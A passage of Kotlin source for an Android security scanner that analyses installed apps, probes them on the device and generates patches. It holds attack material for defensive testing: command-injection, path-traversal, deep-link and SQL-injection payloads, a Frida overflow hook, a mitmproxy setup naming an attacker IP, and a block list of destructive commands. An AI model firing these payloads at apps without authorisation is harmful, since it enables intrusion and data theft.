                                    if (BuildConfig.DEBUG) Log.d(tag, msg)
                                    // In release: send to secure crash reporter only
                                }
                                fun sensitive(tag: String, msg: String) {
                                    // NEVER log: passwords, tokens, keys, PII
                                    // Log only: error codes, operation type
                                    if (BuildConfig.DEBUG) Log.d(tag, "[SENSITIVE DATA REDACTED]")
                                }
                            }
                        """.trimIndent(),
                        manifestChange = null,
                        proguardRule = "-assumenosideeffects class android.util.Log { *; }",
                        references = listOf("https://developer.android.com/studio/debug/am-logcat#privacy")
                    )
                )
            }
        }

        // ── Runtime.exec / Command Injection ─────────────────────────────
        if (strings.any { it.contains("Runtime.exec") || it.contains("ProcessBuilder") }) {
            findings += VulnerabilityFinding(
                id = "DEX-CMD-001",
                category = VulnCategory.COMMAND_INJECTION,
                severity = Severity.CRITICAL,
                title = "Shell Command Execution via Runtime.exec()",
                description = "Runtime.exec() or ProcessBuilder usage detected. If any part of the command string is derived " +
                        "from user input or external data (Intents, ContentProvider, network), command injection is possible.",
                location = "DEX bytecode",
                evidence = "'Runtime.exec' or 'ProcessBuilder' in DEX strings",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = """am start -n $pkg/.MainActivity --es cmd_arg "legit; id > /data/local/tmp/pwned" """,
                        description = "Pass shell metacharacters via Intent extras to trigger command injection",
                        expectedOutcome = "Arbitrary command execution in app's UID context"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 9.3f,
                remediation = RemediationSuggestion(
                    summary = "Never construct shell commands from untrusted input. Use allowlist validation for command arguments.",
                    codeSnippet = """
                        // ❌ VULNERABLE:
                        // Runtime.getRuntime().exec("ffmpeg -i " + userInput)
                        
                        // ✅ SAFE: Use ProcessBuilder with separate argument list (no shell expansion):
                        val args = listOf("ffmpeg", "-i", sanitizedInput)
                        require(sanitizedInput.matches(Regex("[A-Za-z0-9_./-]{1,200}"))) { "Invalid input" }
                        val process = ProcessBuilder(args)
                            .redirectErrorStream(true)
                            .start()
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf("https://owasp.org/www-community/attacks/Command_Injection")
                )
            )
        }

        // ── Insecure Random ───────────────────────────────────────────────
        if (strings.any { it.contains("java.util.Random") && !it.contains("SecureRandom") }) {
            findings += VulnerabilityFinding(
                id = "DEX-CRYPTO-003",
                category = VulnCategory.CRYPTO_INSECURE_RANDOM,
                severity = Severity.MEDIUM,
                title = "java.util.Random Used Instead of SecureRandom",
                description = "java.util.Random is a predictable PRNG — an attacker who observes a few outputs can predict all future/past values. " +
                        "Must not be used for security-sensitive operations (session IDs, tokens, crypto nonces).",
                location = "DEX bytecode",
                evidence = "'java.util.Random' found without 'SecureRandom'",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "# Predict future Random() output after observing seed from logs",
                        description = "Clone the PRNG state and predict generated tokens",
                        expectedOutcome = "Session token / OTP prediction"
                    )
                ),
                verificationStatus = VerificationStatus.LIKELY,
                cvssScore = 6.5f,
                remediation = RemediationSuggestion(
                    summary = "Replace all java.util.Random with java.security.SecureRandom for security-sensitive operations.",
                    codeSnippet = """
                        // ❌ INSECURE:
                        // val rand = Random()
                        // val token = rand.nextLong().toString(16)
                        
                        // ✅ SECURE:
                        val secureRandom = SecureRandom()
                        val tokenBytes = ByteArray(32)
                        secureRandom.nextBytes(tokenBytes)
                        val token = tokenBytes.joinToString("") { "%02x".format(it) }
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf("https://developer.android.com/reference/java/security/SecureRandom")
                )
            )
        }

        // ── Pending Intent Mutable ────────────────────────────────────────
        if (strings.any { it.contains("PendingIntent.getActivity") || it.contains("PendingIntent.getBroadcast") }) {
            if (!strings.any { it.contains("FLAG_IMMUTABLE") }) {
                findings += VulnerabilityFinding(
                    id = "DEX-INTENT-001",
                    category = VulnCategory.PENDING_INTENT_MUTABLE,
                    severity = Severity.HIGH,
                    title = "Mutable PendingIntent (Missing FLAG_IMMUTABLE)",
                    description = "PendingIntent created without FLAG_IMMUTABLE allows malicious apps to modify " +
                            "the Intent before it fires — changing the target component, action, or data URI. " +
                            "Required from API 31 (Android 12).",
                    location = "DEX bytecode (PendingIntent API)",
                    evidence = "PendingIntent created, FLAG_IMMUTABLE not found in DEX strings",
                    exploitPoCs = listOf(
                        ExploitPoC(
                            shellCommand = "# Intercept notification PendingIntent and modify its extras before delivery",
                            description = "Hijack mutable PendingIntent to redirect to attacker-controlled component",
                            expectedOutcome = "Privilege escalation, data theft, or unintended action trigger"
                        )
                    ),
                    verificationStatus = VerificationStatus.LIKELY,
                    cvssScore = 7.0f,
                    remediation = RemediationSuggestion(
                        summary = "Always use FLAG_IMMUTABLE unless mutable behavior is explicitly required.",
                        codeSnippet = """
                            // ❌ MUTABLE (vulnerable):
                            // PendingIntent.getActivity(context, 0, intent, 0)
                            
                            // ✅ IMMUTABLE (safe):
                            PendingIntent.getActivity(
                                context, 0, intent,
                                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                            )
                            // If mutable is truly required (rare):
                            PendingIntent.getActivity(
                                context, 0, intent,
                                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
                            )
                        """.trimIndent(),
                        manifestChange = null,
                        proguardRule = null,
                        references = listOf("https://developer.android.com/reference/android/app/PendingIntent#FLAG_IMMUTABLE")
                    )
                )
            }
        }

        // ── MODE_WORLD_READABLE / MODE_WORLD_WRITEABLE ───────────────────
        if (strings.any { it.contains("MODE_WORLD_READABLE") || it.contains("MODE_WORLD_WRITEABLE") }) {
            findings += VulnerabilityFinding(
                id = "DEX-STORAGE-001",
                category = VulnCategory.STORAGE_WORLD_READABLE,
                severity = Severity.HIGH,
                title = "World-Readable/Writable File Mode",
                description = "MODE_WORLD_READABLE or MODE_WORLD_WRITEABLE detected. These modes expose the app's " +
                        "private files to any other app on the device (deprecated and dangerous since API 17).",
                location = "DEX bytecode",
                evidence = "'MODE_WORLD_READABLE' or 'MODE_WORLD_WRITEABLE' in DEX strings",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "cat /data/data/$pkg/shared_prefs/*.xml  # Readable from any app",
                        description = "Any app reads world-readable files without any permission",
                        expectedOutcome = "Full contents of private shared preferences accessible"
                    )
                ),
                verificationStatus = VerificationStatus.CONFIRMED,
                cvssScore = 7.5f,
                remediation = RemediationSuggestion(
                    summary = "Use Context.MODE_PRIVATE exclusively. For sharing files, use FileProvider.",
                    codeSnippet = """
                        // ❌ INSECURE:
                        // openFileOutput("data.txt", Context.MODE_WORLD_READABLE)
                        
                        // ✅ SECURE private file:
                        openFileOutput("data.txt", Context.MODE_PRIVATE)
                        
                        // ✅ SECURE file sharing with another app:
                        val uri = FileProvider.getUriForFile(context, "$pkg.fileprovider", file)
                        val shareIntent = Intent(Intent.ACTION_SEND).apply {
                            data = uri
                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                        }
                    """.trimIndent(),
                    manifestChange = """
                        <provider android:name="androidx.core.content.FileProvider"
                                  android:authorities="$pkg.fileprovider"
                                  android:grantUriPermissions="true"
                                  android:exported="false">
                            <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
                                       android:resource="@xml/file_provider_paths" />
                        </provider>
                    """.trimIndent(),
                    proguardRule = null,
                    references = listOf("https://developer.android.com/reference/androidx/core/content/FileProvider")
                )
            )
        }

        return findings
    }

    // ── Native Library Analysis ─────────────────────────────────────────

    private fun analyzeNativeLibs(apkPath: String, pkg: String): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()
        val dangerousFunctions = listOf(
            "strcpy", "strcat", "sprintf", "gets", "scanf",   // Buffer overflow risks
            "system", "popen", "exec",                          // Command execution
            "rand", "srand",                                    // Insecure random
            "printf",                                           // Format string if used with user input
        )
        val foundFunctions = mutableListOf<Pair<String, String>>() // (libName, funcName)

        try {
            val zip = ZipFile(apkPath)
            val libEntries = zip.entries().asSequence()
                .filter { it.name.endsWith(".so") && !it.isDirectory }

            libEntries.forEach { entry ->
                try {
                    val bytes = zip.getInputStream(entry).readBytes()
                    // Extract printable ASCII strings from binary (minimal ELF string table parser)
                    val elfStrings = extractPrintableStrings(bytes, minLen = 4)
                    val libName = File(entry.name).name
                    dangerousFunctions.forEach { func ->
                        if (elfStrings.any { s -> s == func || s == "_$func" || s == "${func}@plt" }) {
                            foundFunctions.add(libName to func)
                        }
                    }
                } catch (_: Exception) {}
            }
            zip.close()
        } catch (_: Exception) {}

        if (foundFunctions.isNotEmpty()) {
            val grouped = foundFunctions.groupBy({ it.second }, { it.first })
            val memoryCorruptionFuncs = grouped.keys.intersect(setOf("strcpy", "strcat", "sprintf", "gets", "scanf"))
            if (memoryCorruptionFuncs.isNotEmpty()) {
                findings += VulnerabilityFinding(
                    id = "NATIVE-001",
                    category = VulnCategory.NATIVE_DANGEROUS_FUNC,
                    severity = Severity.CRITICAL,
                    title = "Memory-Unsafe C Functions in Native Libraries",
                    description = "Buffer-overflow-prone functions detected in native code: ${memoryCorruptionFuncs.joinToString(", ")}. " +
                            "These are the root cause of the majority of RCE vulnerabilities in production Android apps.",
                    location = "Native .so files: ${grouped.values.flatten().distinct().take(5).joinToString(", ")}",
                    evidence = "ELF symbol table: ${memoryCorruptionFuncs.take(5).joinToString(", ")}",
                    exploitPoCs = listOf(
                        ExploitPoC(
                            shellCommand = "# Use Frida to hook strcpy calls and inject oversized payload:\n" +
                                    "frida -U -n $pkg -e \"Interceptor.attach(Module.findExportByName(null,'strcpy'), {onEnter: function(a){a[1].writeUtf8String('A'.repeat(1024))}})\"",
                            description = "Instrument native strcpy call with oversized buffer via Frida",
                            expectedOutcome = "Stack smash, controlled crash, or RIP/PC control on vulnerable devices"
                        )
                    ),
                    verificationStatus = VerificationStatus.LIKELY,
                    cvssScore = 9.0f,
                    remediation = RemediationSuggestion(
                        summary = "Replace unsafe C functions with bounds-checking equivalents. Enable compiler security flags.",
                        codeSnippet = """
                            // In CMakeLists.txt — enable security hardening:
                            target_compile_options(your_lib PRIVATE
                                -D_FORTIFY_SOURCE=2
                                -fstack-protector-strong
                                -fPIE
                                -Wformat
                                -Wformat-security
                            )
                            target_link_options(your_lib PRIVATE -Wl,-z,relro -Wl,-z,now -Wl,-z,noexecstack)
                            
                            // In C code — replace unsafe functions:
                            // ❌ strcpy(dst, src);
                            // ✅ strlcpy(dst, src, sizeof(dst));
                            // ❌ strcat(dst, src);
                            // ✅ strlcat(dst, src, sizeof(dst));
                            // ❌ sprintf(buf, fmt, ...);
                            // ✅ snprintf(buf, sizeof(buf), fmt, ...);
                        """.trimIndent(),
                        manifestChange = null,
                        proguardRule = null,
                        references = listOf(
                            "https://developer.android.com/ndk/guides/abis",
                            "https://source.android.com/docs/security/overview/implement"
                        )
                    )
                )
            }
        }

        return findings
    }

    // ── Crypto Analysis (Certificate pinning, SSL bypass) ───────────────

    private fun analyzeCrypto(apkPath: String, pkg: String): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()
        val strings = extractDexStrings(apkPath)

        // SSL/TLS bypass indicators
        val trustAllIndicators = listOf(
            "ALLOW_ALL_HOSTNAME_VERIFIER",
            "NullHostnameVerifier",
            "TrustAllCerts",
            "trustAll",
            "X509TrustManager",
        )
        val sslBypass = trustAllIndicators.filter { indicator ->
            strings.any { s -> s.contains(indicator, ignoreCase = true) }
        }
        // Only flag if combined with empty checkServerTrusted pattern
        val hasEmptyCheckServer = strings.any { s ->
            s.contains("checkServerTrusted") || s.contains("checkClientTrusted")
        }
        if (sslBypass.isNotEmpty() || hasEmptyCheckServer) {
            findings += VulnerabilityFinding(
                id = "CRYPTO-SSL-001",
                category = VulnCategory.NETWORK_CERT_BYPASS,
                severity = Severity.CRITICAL,
                title = "TLS Certificate Validation Bypass",
                description = "Trust-all or hostname-verifier bypass code detected. This completely disables HTTPS security — " +
                        "all traffic is vulnerable to MitM attacks. Attacker with mitmproxy intercepts all encrypted communication.",
                location = "DEX bytecode (X509TrustManager / HostnameVerifier)",
                evidence = "Bypass indicators: ${(sslBypass + if (hasEmptyCheckServer) listOf("checkServerTrusted") else emptyList()).joinToString(", ")}",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = """
                            # MitM attack: Set up mitmproxy and route device traffic through it:
                            mitmproxy --mode transparent --ssl-insecure
                            # Then on device:
                            adb shell settings put global http_proxy <attacker_ip>:8080
                        """.trimIndent(),
                        description = "Intercept and modify all HTTPS traffic (cert validation is bypassed)",
                        expectedOutcome = "Full decryption of all API calls, credential theft, response manipulation"
                    )
                ),
                verificationStatus = VerificationStatus.LIKELY,
                cvssScore = 9.8f,
                remediation = RemediationSuggestion(
                    summary = "Remove all trust-all TrustManagers. Implement certificate pinning via OkHttp CertificatePinner.",
                    codeSnippet = """
                        // ❌ NEVER do this:
                        // object TrustAll : X509TrustManager {
                        //     override fun checkServerTrusted(chain, authType) {} // Empty = bypass!
                        // }
                        
                        // ✅ Implement proper TLS with certificate pinning:
                        val client = OkHttpClient.Builder()
                            .certificatePinner(
                                CertificatePinner.Builder()
                                    .add("api.yourdomain.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
                                    .add("api.yourdomain.com", "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // Backup pin
                                    .build()
                            )
                            .build()
                        // Generate pin: okhttp-pin-generator or: openssl s_client -connect host:443 | openssl x509 -pubkey | openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | base64
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf(
                        "https://square.github.io/okhttp/4.x/okhttp/okhttp3/-certificate-pinner/",
                        "https://developer.android.com/training/articles/security-ssl"
                    )
                )
            )
        }

        return findings
    }

    // ═══ Phase 2: Dynamic Probing ══════════════════════════════════════════

    private suspend fun runDynamicProbes(
        context: Context,
        pm: PackageManager,
        packageInfo: PackageInfo,
        pkg: String,
        existingFindings: List<VulnerabilityFinding>
    ): List<VulnerabilityFinding> = withContext(Dispatchers.IO) {
        val dynamicFindings = mutableListOf<VulnerabilityFinding>()

        // ── Deep Link Fuzzing ─────────────────────────────────────────────
        val deepLinkFindings = probeDeepLinks(pkg, packageInfo)
        dynamicFindings.addAll(deepLinkFindings)

        // ── ContentProvider SQL Injection ─────────────────────────────────
        val cpFindings = probeContentProviders(pkg, packageInfo)
        dynamicFindings.addAll(cpFindings)

        // ── Intent Crash Fuzzing (check logcat for crashes) ───────────────
        val crashFindings = probeIntentFuzzing(pkg, packageInfo)
        dynamicFindings.addAll(crashFindings)

        dynamicFindings
    }

    private suspend fun probeDeepLinks(
        pkg: String,
        packageInfo: PackageInfo
    ): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()

        // Collect deep link schemes from activities
        // (PackageManager doesn't expose intent filter data/scheme directly at runtime
        //  so we use basic heuristics: activities that are exported + likely handle VIEW)
        val exportedActivities = packageInfo.activities?.filter { it.exported } ?: return findings

        // Standard path traversal payloads for deep link testing
        val traversalPayloads = listOf(
            "../../../../../../etc/passwd",
            "file:///data/data/$pkg/shared_prefs/",
            "file:///data/data/$pkg/databases/",
            "javascript:alert(document.cookie)",
            "intent://evil.com#Intent;scheme=http;package=com.browser;end"
        )

        exportedActivities.take(5).forEach { act ->
            traversalPayloads.take(2).forEach { payload ->
                val cmd = "am start -n $pkg/${act.name} -d \"$payload\" --activity-no-history 2>&1"
                val result = withTimeoutOrNull(PROBE_TIMEOUT_MS) {
                    ShizukuCommandTool.execute(cmd)
                }
                val output = when (result) {
                    is ShizukuResult.Success -> result.output
                    is ShizukuResult.PartialSuccess -> result.output
                    else -> ""
                }

                // Check for suspicious outcomes: no "Error" in output = likely accepted
                if (output.isNotBlank() && !output.contains("Error", ignoreCase = true) &&
                    !output.contains("ActivityNotFound", ignoreCase = true)) {
                    findings += VulnerabilityFinding(
                        id = "DYN-DEEPLINK-${act.name.hashCode().and(0xFFFF).toString(16)}",
                        category = VulnCategory.DEEPLINK_INJECTION,
                        severity = Severity.HIGH,
                        title = "Deep Link URI Injection Accepted: ${act.name.substringAfterLast('.')}",
                        description = "Activity accepted a crafted URI without validation. Path traversal or javascript: " +
                                "URI injection may lead to file read or XSS in embedded WebViews.",
                        location = "Activity: ${act.name}",
                        evidence = "am start succeeded with payload: ${payload.take(80)}\nOutput: ${output.take(200)}",
                        exploitPoCs = listOf(
                            ExploitPoC(
                                shellCommand = "am start -n $pkg/${act.name} -d \"$payload\"",
                                description = "Deep link injection with traversal payload",
                                expectedOutcome = "File content displayed or JS executed in WebView",
                                verificationResult = "Launch succeeded: ${output.take(100)}"
                            )
                        ),
                        verificationStatus = VerificationStatus.LIKELY,
                        cvssScore = 7.5f,
                        remediation = RemediationSuggestion(
                            summary = "Validate and allowlist all deep link URI schemes, hosts, and paths before processing.",
                            codeSnippet = """
                                override fun onCreate(savedInstanceState: Bundle?) {
                                    super.onCreate(savedInstanceState)
                                    val uri = intent?.data ?: return
                                    
                                    // Allowlist validation:
                                    require(uri.scheme in listOf("https", "myapp")) { "Invalid scheme" }
                                    require(uri.host == "yourdomain.com") { "Invalid host" }
                                    
                                    // Block path traversal:
                                    val path = uri.path ?: ""
                                    require(!path.contains("..") && !path.contains("%2e%2e", ignoreCase = true)) {
                                        "Path traversal detected"
                                    }
                                    
                                    // Allowlist paths:
                                    val allowedPaths = setOf("/product", "/category", "/search")
                                    require(allowedPaths.any { path.startsWith(it) }) { "Unknown path" }
                                }
                            """.trimIndent(),
                            manifestChange = null,
                            proguardRule = null,
                            references = listOf("https://developer.android.com/training/app-links/deep-linking#adding-filters")
                        )
                    )
                }
            }
        }

        return findings
    }

    private suspend fun probeContentProviders(
        pkg: String,
        packageInfo: PackageInfo
    ): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()
        val exportedProviders = packageInfo.providers?.filter { it.exported } ?: return findings

        // SQL injection payloads
        val sqlPayloads = listOf(
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT name,sql,null FROM sqlite_master--"
        )

        exportedProviders.take(3).forEach { prov ->
            prov.authority?.split(";")?.take(2)?.forEach { auth ->
                // First probe: basic query (data disclosure)
                val baseCmd = "content query --uri 'content://$auth/' 2>&1"
                val baseResult = withTimeoutOrNull(PROBE_TIMEOUT_MS) {
                    ShizukuCommandTool.execute(baseCmd)
                }
                val baseOutput = when (baseResult) {
                    is ShizukuResult.Success -> baseResult.output
                    is ShizukuResult.PartialSuccess -> baseResult.output
                    else -> ""
                }

                if (baseOutput.isNotBlank() && baseOutput.contains("Row:")) {
                    // Data is accessible — now try SQL injection
                    sqlPayloads.take(2).forEach { payload ->
                        val sqliCmd = "content query --uri 'content://$auth/' --where \"$payload\" 2>&1"
                        val sqliResult = withTimeoutOrNull(PROBE_TIMEOUT_MS) {
                            ShizukuCommandTool.execute(sqliCmd)
                        }
                        val sqliOutput = when (sqliResult) {
                            is ShizukuResult.Success -> sqliResult.output
                            is ShizukuResult.PartialSuccess -> sqliResult.output
                            else -> ""
                        }

                        if (sqliOutput.isNotBlank() && !sqliOutput.contains("Exception") &&
                            sqliOutput.contains("Row:")) {
                            findings += VulnerabilityFinding(
                                id = "DYN-SQLI-${auth.hashCode().and(0xFFFF).toString(16)}",
                                category = VulnCategory.SQL_INJECTION,
                                severity = Severity.CRITICAL,
                                title = "ContentProvider SQL Injection Confirmed: $auth",
                                description = "SQL injection in ContentProvider query() method confirmed via dynamic probe. " +
                                        "Attacker can exfiltrate all database tables, bypass row-level security.",
                                location = "ContentProvider: $auth",
                                evidence = "SQL payload '$payload' returned rows:\n${sqliOutput.take(300)}",
                                exploitPoCs = listOf(
                                    ExploitPoC(
                                        shellCommand = "content query --uri 'content://$auth/' --where \"1=1 UNION SELECT name,sql,null FROM sqlite_master--\"",
                                        description = "Dump all table names and schema via UNION injection",
                                        expectedOutcome = "Complete database schema disclosure",
                                        verificationResult = sqliOutput.take(400)
                                    )
                                ),
                                verificationStatus = VerificationStatus.CONFIRMED,
                                cvssScore = 9.5f,
                                remediation = RemediationSuggestion(
                                    summary = "Use parameterized queries exclusively. Never concatenate user-supplied selection strings.",
                                    codeSnippet = """
                                        override fun query(uri: Uri, projection: Array<String>?, selection: String?,
                                                           selectionArgs: Array<String>?, sortOrder: String?): Cursor? {
                                            // ❌ NEVER: db.rawQuery("SELECT * FROM t WHERE " + selection, null)
                                            
                                            // ✅ Use Room's type-safe queries, or parameterized SQLiteDatabase:
                                            val safeSelection = buildSafeSelection(uri)  // Build from URI path, not user input
                                            return db.query(TABLE_NAME, safeColumns, safeSelection,
                                                            selectionArgs, null, null, safeSortOrder)
                                        }
                                        
                                        private fun buildSafeSelection(uri: Uri): String {
                                            val id = ContentUris.parseId(uri)  // Parse from path, not query param
                                            return "${'$'}ID_COL = ${'$'}id"
                                        }
                                    """.trimIndent(),
                                    manifestChange = null,
                                    proguardRule = null,
                                    references = listOf("https://developer.android.com/training/data-storage/sqlite#DbHelper")
                                )
                            )
                        }
                    }
                }
            }
        }

        return findings
    }

    private suspend fun probeIntentFuzzing(
        pkg: String,
        packageInfo: PackageInfo
    ): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()

        // Clear logcat before probing
        withTimeoutOrNull(2000L) { ShizukuCommandTool.execute("logcat -c") }

        // Fuzz exported activities with null/malformed extras
        val exportedActivities = packageInfo.activities?.filter { it.exported }?.take(5) ?: return findings

        exportedActivities.forEach { act ->
            // Launch with no extras (test for NullPointerException / crash)
            val cmd = "am start -n $pkg/${act.name} --activity-no-history 2>&1; sleep 1"
            withTimeoutOrNull(PROBE_TIMEOUT_MS + 1500L) {
                ShizukuCommandTool.execute(cmd)
            }
        }

        // Check logcat for crashes
        val logcatResult = withTimeoutOrNull(3000L) {
            ShizukuCommandTool.execute("logcat -d -t 200 *:E 2>&1 | grep -i '$pkg\\|AndroidRuntime\\|FATAL' | head -30")
        }
        val logcatOutput = when (logcatResult) {
            is ShizukuResult.Success -> logcatResult.output
            is ShizukuResult.PartialSuccess -> logcatResult.output
            else -> ""
        }

        if (logcatOutput.contains("FATAL EXCEPTION") || logcatOutput.contains("NullPointerException") ||
            logcatOutput.contains("java.lang.RuntimeException")) {
            findings += VulnerabilityFinding(
                id = "DYN-CRASH-001",
                category = VulnCategory.ACTIVITY_HIJACKING,
                severity = Severity.MEDIUM,
                title = "Activity Crash via Intent Fuzzing",
                description = "One or more exported activities crash when launched without expected extras. " +
                        "This indicates missing input validation that can cause denial of service.",
                location = "Exported activities in $pkg",
                evidence = "Logcat FATAL EXCEPTION after intent fuzzing:\n${logcatOutput.take(400)}",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "am start -n $pkg/${exportedActivities.first().name} --activity-no-history",
                        description = "Trigger crash via empty Intent (no extras)",
                        expectedOutcome = "App crashes — potential DoS for security-critical apps",
                        verificationResult = logcatOutput.take(300)
                    )
                ),
                verificationStatus = VerificationStatus.CONFIRMED,
                cvssScore = 5.3f,
                remediation = RemediationSuggestion(
                    summary = "Validate and provide defaults for all Intent extras before processing.",
                    codeSnippet = """
                        override fun onCreate(savedInstanceState: Bundle?) {
                            super.onCreate(savedInstanceState)
                            // ✅ Safe extras extraction with defaults:
                            val userId = intent?.getStringExtra("user_id")?.takeIf { it.isNotBlank() }
                            if (userId == null) {
                                // Handle gracefully — don't crash:
                                finish()
                                return
                            }
                            // ✅ Also wrap in try-catch for third-party Intent data
                        }
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf("https://developer.android.com/guide/components/intents-filters")
                )
            )
        }

        return findings
    }

    // ═══ Phase 3: Exploit Verification ════════════════════════════════════

    private suspend fun verifyExploits(
        findings: List<VulnerabilityFinding>
    ): List<VulnerabilityFinding> = withContext(Dispatchers.IO) {
        findings.map { finding ->
            if (finding.verificationStatus == VerificationStatus.UNVERIFIED && finding.exploitPoCs.isNotEmpty()) {
                // Only run safe, read-only PoCs for verification (skip destructive ones)
                val firstPoC = finding.exploitPoCs.firstOrNull { isSafeToVerify(it) } ?: return@map finding

                val result = withTimeoutOrNull(PROBE_TIMEOUT_MS) {
                    ShizukuCommandTool.execute(firstPoC.shellCommand)
                }
                val output = when (result) {
                    is ShizukuResult.Success -> result.output
                    is ShizukuResult.PartialSuccess -> result.output
                    is ShizukuResult.Failure -> "FAILURE: ${result.reason}"
                    null -> "TIMEOUT"
                    else -> "UNKNOWN"
                }

                // Heuristic: if command ran without error and produced output → likely confirmed
                val confirmed = output.isNotBlank() &&
                        !output.startsWith("FAILURE") &&
                        !output.startsWith("TIMEOUT") &&
                        !output.contains("ActivityNotFound", ignoreCase = true) &&
                        !output.contains("Permission denied", ignoreCase = true)

                val updatedPoCs = finding.exploitPoCs.toMutableList()
                if (updatedPoCs.isNotEmpty()) {
                    updatedPoCs[0] = updatedPoCs[0].copy(verificationResult = output.take(300))
                }

                finding.copy(
                    verificationStatus = if (confirmed) VerificationStatus.CONFIRMED else VerificationStatus.UNVERIFIED,
                    exploitPoCs = updatedPoCs
                )
            } else {
                finding
            }
        }
    }

    /** Returns true if this PoC command is safe to run (read-only, no destructive operations). */
    private fun isSafeToVerify(poc: ExploitPoC): Boolean {
        val cmd = poc.shellCommand.lowercase()
        val destructiveKeywords = listOf("rm -rf", "format", "wipe", "drop table", "delete from",
            "reboot", "poweroff", "mkfs", "dd if=", "> /dev/")
        return destructiveKeywords.none { cmd.contains(it) }
    }

    // ═══ Phase 4: Remediation Bundle ════════════════════════════════════

    private fun buildPatchBundle(pkg: String, findings: List<VulnerabilityFinding>): String = buildString {
        appendLine("// ═══════════════════════════════════════════════════════════════════")
        appendLine("// AUTO-GENERATED PATCH BUNDLE for: $pkg")
        appendLine("// Generated: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())}")
        appendLine("// Findings addressed: ${findings.size}")
        appendLine("// ═══════════════════════════════════════════════════════════════════")
        appendLine()

        // Manifest changes section
        val manifestChanges = findings.mapNotNull { it.remediation.manifestChange }
        if (manifestChanges.isNotEmpty()) {
            appendLine("// ─── AndroidManifest.xml Changes ────────────────────────────────────")
            appendLine("// Apply these changes to your AndroidManifest.xml:")
            manifestChanges.forEachIndexed { i, change ->
                appendLine("// Change ${i + 1}:")
                appendLine(change)
                appendLine()
            }
        }

        // ProGuard rules
        val proguardRules = findings.mapNotNull { it.remediation.proguardRule }
        if (proguardRules.isNotEmpty()) {
            appendLine("// ─── proguard-rules.pro Additions ──────────────────────────────────")
            proguardRules.distinct().forEach { rule ->
                appendLine(rule)
            }
            appendLine()
        }

        // Code patches
        appendLine("// ─── Kotlin/Java Code Patches ──────────────────────────────────────")
        findings.sortedByDescending { it.cvssScore }.forEach { f ->
            appendLine()
            appendLine("// [${f.id}] ${f.severity.emoji} ${f.title} (CVSS: ${f.cvssScore})")
            appendLine("// CWE: ${f.category.cwe} | Status: ${f.verificationStatus.name}")
            appendLine(f.remediation.codeSnippet)
            appendLine()
            appendLine("// References:")
            f.remediation.references.forEach { ref -> appendLine("// → $ref") }
            appendLine("// " + "─".repeat(70))
        }
    }

    // ═══ Helpers ══════════════════════════════════════════════════════════

    private fun extractDexStrings(apkPath: String): List<String> {
        val strings = mutableListOf<String>()
        return try {
            val zip = ZipFile(apkPath)
            val dexEntries = zip.entries().asSequence()
                .filter { it.name.matches(Regex("classes\\d*\\.dex")) }
                .take(3) // Scan first 3 DEX files max

            dexEntries.forEach { entry ->
                try {
                    val bytes = zip.getInputStream(entry).readBytes()
                    strings.addAll(extractPrintableStrings(bytes, minLen = 5))
                    if (strings.size > MAX_DEX_STRINGS) return@forEach
                } catch (_: Exception) {}
            }
            zip.close()
            strings.take(MAX_DEX_STRINGS)
        } catch (_: Exception) {
            strings
        }
    }

    /** Extracts printable ASCII strings from binary data (like Unix strings(1)). */
    private fun extractPrintableStrings(bytes: ByteArray, minLen: Int = 4): List<String> {
        val result = mutableListOf<String>()
        val sb = StringBuilder()
        for (b in bytes) {
            val c = b.toInt().and(0xFF)
            if (c in 0x20..0x7E) {
                sb.append(c.toChar())
            } else {
                if (sb.length >= minLen) result.add(sb.toString())
                sb.clear()
            }
        }
        if (sb.length >= minLen) result.add(sb.toString())
        return result
    }

    private fun loadPackageInfo(pm: PackageManager, packageName: String): PackageInfo? {
        val flags = (PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES or
                PackageManager.GET_RECEIVERS or PackageManager.GET_PROVIDERS or
                PackageManager.GET_META_DATA).toLong()
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getPackageInfo(packageName, PackageManager.PackageInfoFlags.of(flags))
            } else {
                @Suppress("DEPRECATION")
                pm.getPackageInfo(packageName, flags.toInt())
            }
        } catch (_: Exception) { null }
    }

    private fun buildAttackSurfaceSummary(pm: PackageManager, packageInfo: PackageInfo): String {
        val exportedAct = packageInfo.activities?.count { it.exported } ?: 0
        val exportedSvc = packageInfo.services?.count { it.exported } ?: 0
        val exportedRcv = packageInfo.receivers?.count { it.exported } ?: 0
        val exportedPrv = packageInfo.providers?.count { it.exported } ?: 0
        val bareAct = packageInfo.activities?.count {
            it.exported && EnhancedAppManifestAnalyzerTool.getComponentPermission(it) == null
        } ?: 0
        return "Exported: Act=$exportedAct (bare=$bareAct) | Svc=$exportedSvc | Rcv=$exportedRcv | Prv=$exportedPrv"
    }

    private fun calculateRiskScore(findings: List<VulnerabilityFinding>): Int {
        if (findings.isEmpty()) return 0
        val baseScore = findings.sumOf { f ->
            when (f.severity) {
